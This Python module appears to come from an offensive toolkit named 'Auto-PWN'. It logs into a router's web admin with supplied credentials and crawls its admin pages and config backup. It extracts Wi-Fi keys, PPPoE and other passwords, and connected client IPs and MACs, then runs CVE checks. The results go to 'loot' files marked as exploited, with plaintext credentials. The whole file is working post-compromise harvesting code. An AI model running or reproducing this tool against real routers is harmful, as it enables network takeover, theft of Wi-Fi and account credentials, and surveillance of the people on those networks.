"""
Deep harvest on an already-authenticated router web session.

Use when the operator provides http://user:pass@ip/ — crawls admin pages,
extracts device info, Wi-Fi, DHCP clients, secrets in HTML, and CVE hints.
"""

from __future__ import annotations

import json
import os
import re
from html import unescape
from typing import Any
from urllib.parse import urljoin, urlparse

import requests

from core.target_auth import auth_from_hints, parse_target_auth
from engines.credential_hunter import _extract_wireless_hints, _netis_login_url
from engines.device_cve_checker import assess_device, print_cve_report
from engines.fingerprinter import Fingerprinter
from engines.loot_report import LootEntry, LootReport
from engines.utils import extract_credentials, extract_ip, log, save_success

# Common admin paths (Netis, ZyXEL-style, generic CPE).
SEED_PATHS: tuple[str, ...] = (
    "/",
    "/index.htm",
    "/main.htm",
    "/status.htm",
    "/wan.htm",
    "/wireless.htm",
    "/wl_basic.htm",
    "/wlan.htm",
    "/lan.htm",
    "/dhcp.htm",
    "/dhcp_clients.htm",
    "/lan_clients.htm",
    "/stat.htm",
    "/statistics.htm",
    "/deviceinfo.htm",
    "/Device_info.htm",
    "/device_info.htm",
    "/sysinfo.htm",
    "/maintenance.htm",
    "/backup.htm",
    "/config.bin",
    "/cgi-bin/luci/admin/status/overview",
    "/cgi-bin/luci/admin/network/dhcp",
    "/cgi-bin/luci/admin/network/wireless",
)

MENU_KEYWORDS = re.compile(
    r"(device_info|deviceinfo|status|statistics|wireless|wlan|dhcp|lan|wan|"
    r"firewall|maintenance|backup|adsl|ppp|user|password|client)",
    re.I,
)
IP_RE = re.compile(r"\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b")
MAC_RE = re.compile(r"\b([0-9a-f]{2}(?::[0-9a-f]{2}){5})\b", re.I)
KV_RE = re.compile(
    r"(?:<td[^>]*>\s*)?([A-Za-z][\w\s./\-]{2,40})(?:</td>)?\s*"
    r"(?:<td[^>]*>|:)\s*([^<\n\r]{1,120})",
    re.I,
)


def _session() -> requests.Session:
    s = requests.Session()
    s.verify = False
    s.headers["User-Agent"] = "Mozilla/5.0 Auto-PWN-RouterHarvest/1.0"
    return s


def _load_hints(target_dir: str) -> dict:
    path = os.path.join(target_dir, "target_hints.json")
    if not os.path.isfile(path):
        return {}
    try:
        with open(path, "r", encoding="utf-8") as fh:
            return json.load(fh)
    except (OSError, json.JSONDecodeError):
        return {}


def resolve_auth(
    raw_target: str,
    target_dir: str,
    username: str | None = None,
    password: str | None = None,
) -> dict[str, Any]:
    """Build connection dict: host, port, base_url, username, password."""
    auth = parse_target_auth(raw_target)
    if auth:
        return auth
    hints = _load_hints(target_dir)
    hint_pair = auth_from_hints(hints)
    host = hints.get("host") or extract_ip(raw_target) or raw_target.strip()
    port = int(hints.get("port") or 80)
    scheme = hints.get("scheme") or "http"
    user = username
    pwd = password or ""
    if hint_pair:
        user, pwd = hint_pair
    if not user:
        u, p = extract_credentials(raw_target)
        if u:
            user, pwd = u, p or ""
    if not user:
        raise ValueError(
            "No credentials — use http://user:pass@IP/ in the target bar or pass username/password."
        )
    if port in (80, 443):
        netloc = host
    else:
        netloc = f"{host}:{port}"
    base = f"{scheme}://{netloc}"
    return {
        "username": user,
        "password": pwd,
        "scheme": scheme,
        "host": host,
        "port": port,
        "path": "/",
        "base_url": base,
        "authenticated_url": f"{scheme}://{user}:{pwd}@{netloc}/",
    }


def establish_session(conn: dict[str, Any]) -> tuple[requests.Session, str]:
    """Return authenticated session and auth_method label."""
    base = conn["base_url"]
    user = conn["username"]
    password = conn["password"]
    session = _session()

    if _netis_login_url(base):
        session.post(
            f"{base}/login.cgi",
            data={
                "username": user,
                "password": password,
                "submit.htm?login.htm": "Send",
            },
            timeout=12,
        )
        probe = session.get(f"{base}/index.htm", timeout=10)
        body = probe.text.lower()
        if probe.status_code == 200 and (
            "login.htm" not in body[:2000] or "logout" in body or "wireless" in body
        ):
            if "error" not in body[:1500] and "alert" not in body[:1500]:
                return session, "Netis form (login.cgi)"

    session.auth = (user, password)
    try:
        r = session.get(base + "/", timeout=10)
        text = r.text.lower()
        if r.status_code == 200 and not ('name="password"' in text[:3000] and "logout" not in text):
            if any(x in text for x in ("logout", "device_info", "wireless", "dhcp", "status", "wan")):
                return session, "HTTP Basic/Digest"
    except requests.RequestException:
        pass

    session.auth = None
    r = session.get(base + "/", auth=(user, password), timeout=10)
    text = r.text.lower()
    if r.status_code == 200 and any(
        x in text for x in ("logout", "sign out", "device_info", "wireless", "dhcp", "statistics")
    ):
        return session, "HTTP auth (explicit)"

    raise RuntimeError(
        f"Could not verify login for {user}@{conn['host']} — check URL/credentials."
    )


def _discover_hrefs(base: str, html: str) -> list[str]:
    found: list[str] = []
    for m in re.finditer(r"""href\s*=\s*['"]([^'"]+)['"]""", html, re.I):
        href = unescape(m.group(1).strip())
        if not href or href.startswith(("#", "javascript:", "mailto:")):
            continue
        full = urljoin(base + "/", href)
        parsed = urlparse(full)
        base_p = urlparse(base)
        if parsed.hostname and parsed.hostname != base_p.hostname:
            continue
        path = parsed.path or "/"
        if not MENU_KEYWORDS.search(path) and not path.endswith(
            (".htm", ".html", ".asp", ".cgi", ".php")
        ):
            continue
        if full not in found:
            found.append(full)
    return found[:35]


def _extract_key_values(html: str) -> dict[str, str]:
    fields: dict[str, str] = {}
    for m in KV_RE.finditer(html):
        key = re.sub(r"\s+", " ", m.group(1)).strip()
        val = re.sub(r"\s+", " ", unescape(m.group(2))).strip()
        if len(key) < 3 or len(val) < 1:
            continue
        if key.lower() in ("click", "button", "submit"):
            continue
        fields[key] = val[:200]
    for m in re.finditer(
        r'<input[^>]+name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\']',
        html,
        re.I,
    ):
        name = m.group(1)
        val = m.group(2)
        if "pass" in name.lower() or "key" in name.lower() or "ssid" in name.lower():
            fields[name] = val
    return fields


def _extract_clients(html: str) -> list[dict[str, str]]:
    clients: list[dict[str, str]] = []
    seen: set[str] = set()
    for row in re.findall(r"<tr[^>]*>(.*?)</tr>", html, re.I | re.S):
        ips = IP_RE.findall(row)
        macs = MAC_RE.findall(row)
        if not ips:
            continue
        ip = ips[0]
        if ip.startswith(("0.", "255.")) or ip in seen:
            continue
        seen.add(ip)
        entry: dict[str, str] = {"ip": ip}
        if macs:
            entry["mac"] = macs[0]
        name_m = re.search(r"<td[^>]*>([^<]{2,40})</td>", row, re.I)
        if name_m and not IP_RE.match(name_m.group(1).strip()):
            entry["name"] = name_m.group(1).strip()
        clients.append(entry)
    return clients


def _fetch_page(session: requests.Session, url: str) -> tuple[str, int]:
    try:
        r = session.get(url, timeout=12, allow_redirects=True)
        return r.text, r.status_code
    except requests.RequestException as exc:
        return f"<!-- error: {exc} -->", 0


def run_router_harvest(
    target_dir: str,
    raw_target: str = "",
    *,
    username: str | None = None,
    password: str | None = None,
    max_pages: int = 45,
) -> dict[str, Any]:
    """
    Full authenticated router harvest. Writes ROUTER_HARVEST.json / .txt / pages/.
    """
    os.makedirs(target_dir, exist_ok=True)
    conn = resolve_auth(raw_target, target_dir, username, password)
    ip = conn["host"]
    log(f"Router harvest: {conn['username']}@{ip} (workspace {target_dir})", "SUCCESS")

    session, auth_method = establish_session(conn)
    base = conn["base_url"]

    fp = Fingerprinter(conn.get("authenticated_url") or base)
    fp_info = fp.identify_details()
    device_type = fp_info.get("device_type", "UNKNOWN")
    model = fp_info.get("model", "")
    server = fp_info.get("server", "")

    pages_dir = os.path.join(target_dir, "router_harvest_pages")
    os.makedirs(pages_dir, exist_ok=True)

    to_visit: list[str] = []
    for path in SEED_PATHS:
        to_visit.append(urljoin(base + "/", path.lstrip("/")))
    visited: set[str] = set()
    page_store: dict[str, dict[str, Any]] = {}
    all_fields: dict[str, str] = {}
    all_clients: list[dict[str, str]] = []
    wireless_ssid, wireless_key = "", ""

    while to_visit and len(visited) < max_pages:
        url = to_visit.pop(0)
        norm = url.split("?", 1)[0]
        if norm in visited:
            continue
        visited.add(norm)
        html, status = _fetch_page(session, url)
        if status not in (200, 206) or len(html) < 40:
            continue

        safe_name = re.sub(r"[^\w.\-]+", "_", urlparse(norm).path.strip("/") or "root")[:80]
        page_path = os.path.join(pages_dir, f"{safe_name}.html")
        with open(page_path, "w", encoding="utf-8", errors="ignore") as fh:
            fh.write(html)

        fields = _extract_key_values(html)
        for k, v in fields.items():
            all_fields.setdefault(k, v)
        clients = _extract_clients(html)
        for c in clients:
            if c not in all_clients:
                all_clients.append(c)
        ssid, key = _extract_wireless_hints(html)
        wireless_ssid = wireless_ssid or ssid
        wireless_key = wireless_key or key

        page_store[norm] = {
            "status": status,
            "file": page_path,
            "fields": fields,
            "clients": clients,
        }
        log(f"Harvested: {urlparse(norm).path or '/'} ({len(fields)} fields, {len(clients)} clients)", "INFO")

        for link in _discover_hrefs(base, html):
            if link.split("?", 1)[0] not in visited and link not in to_visit:
                to_visit.append(link)

    intel = assess_device(
        ip,
        conn["port"],
        device_type,
        model=model,
        server=server,
        auth=(conn["username"], conn["password"]),
    )
    cve_lines: list[str] = []
    for a in intel.assessments:
        cve_lines.append(f"{a.cve_id} [{a.severity}] {a.status}: {a.title}")

    credentials = [
        {
            "service": "router_web",
            "username": conn["username"],
            "password": conn["password"],
            "auth_method": auth_method,
        }
    ]
    if wireless_ssid or wireless_key:
        credentials.append(
            {
                "service": "wireless",
                "ssid": wireless_ssid,
                "password": wireless_key,
            }
        )

    secrets: list[str] = []
    for key, val in all_fields.items():
        kl = key.lower()
        if any(x in kl for x in ("pass", "psk", "wpa", "key", "secret", "pppoe")):
            secrets.append(f"{key}={val}")

    summary: dict[str, Any] = {
        "host": ip,
        "port": conn["port"],
        "base_url": base,
        "authenticated_url": conn.get("authenticated_url"),
        "username": conn["username"],
        "password": conn["password"],
        "auth_method": auth_method,
        "device_type": device_type,
        "model": model,
        "server": server,
        "pages_fetched": len(page_store),
        "device_fields": all_fields,
        "connected_clients": all_clients,
        "wireless": {"ssid": wireless_ssid, "key": wireless_key},
        "secrets_in_html": secrets,
        "credentials": credentials,
        "cve_assessments": [
            {
                "cve_id": a.cve_id,
                "title": a.title,
                "severity": a.severity,
                "status": a.status,
                "reason": a.reason,
            }
            for a in intel.assessments
        ],
        "nuclei_templates": list(intel.nuclei_templates)[:30],
        "nuclei_tags": list(intel.nuclei_tags)[:20],
        "pages": {k: {"file": v["file"], "field_count": len(v["fields"])} for k, v in page_store.items()},
    }

    json_path = os.path.join(target_dir, "ROUTER_HARVEST.json")
    with open(json_path, "w", encoding="utf-8") as fh:
        json.dump(summary, fh, indent=2, ensure_ascii=False)

    txt_lines = [
        "=" * 60,
        f"ROUTER HARVEST — {ip}",
        f"Login: {conn['username']}:{conn['password']} ({auth_method})",
        f"Device: {device_type} | {model} | Server: {server}",
        f"Pages saved: {len(page_store)} → {pages_dir}",
        "=" * 60,
        "",
        "— CVE / risk —",
    ]
    txt_lines.extend(cve_lines or ["(none from fingerprint)"])
    txt_lines.extend(["", "— Wireless —", f"SSID: {wireless_ssid or '—'}", f"Key: {wireless_key or '—'}"])
    txt_lines.extend(["", "— Connected clients —"])
    if all_clients:
        for c in all_clients:
            txt_lines.append(f"  {c.get('ip', '?')}  mac={c.get('mac', '—')}  name={c.get('name', '—')}")
    else:
        txt_lines.append("  (none parsed — check HTML in router_harvest_pages/)")
    txt_lines.extend(["", "— Secrets / passwords in forms —"])
    txt_lines.extend(secrets or ["  (none)"])
    txt_lines.extend(["", "— Device fields (sample) —"])
    for k, v in list(all_fields.items())[:40]:
        txt_lines.append(f"  {k}: {v}")
    txt_path = os.path.join(target_dir, "ROUTER_HARVEST.txt")
    with open(txt_path, "w", encoding="utf-8") as fh:
        fh.write("\n".join(txt_lines))

    access_path = os.path.join(target_dir, "ROUTER_ACCESS.txt")
    with open(access_path, "w", encoding="utf-8") as fh:
        fh.write(
            f"{conn['username']}:{conn['password']}\n"
            f"url={conn.get('authenticated_url') or base}\n"
            f"method={auth_method}\n"
        )

    loot = LootReport(ip)
    loot.add(
        LootEntry(
            ip=ip,
            port=conn["port"],
            device_type=device_type,
            model=model,
            username=conn["username"],
            password=conn["password"],
            auth_method=auth_method,
            wireless_ssid=wireless_ssid,
            wireless_key=wireless_key,
        )
    )
    loot_path = os.path.join(target_dir, "ENGINE_LOOT.json")
    from dataclasses import asdict

    with open(loot_path, "w", encoding="utf-8") as fh:
        json.dump(
            {
                "summary": {"exploited": True, "device_type": device_type},
                "loot": {
                    "entries": [asdict(e) for e in loot.entries],
                    "files": loot.files,
                    "notes": loot.notes,
                },
            },
            fh,
            indent=2,
            ensure_ascii=False,
        )
    loot.print_final()

    save_success(ip, f"Router web ({conn['port']})", f"{conn['username']}:{conn['password']}")
    log(f"Router harvest saved: {txt_path}", "SUCCESS")
    print_cve_report(intel)

    from core.workflow_recommendations import emit_post_tool_recommendations

    emit_post_tool_recommendations(
        target_dir,
        ip,
        finished_tool="router-harvest",
        exploited=True,
        job_kind="custom",
    )
    return summary
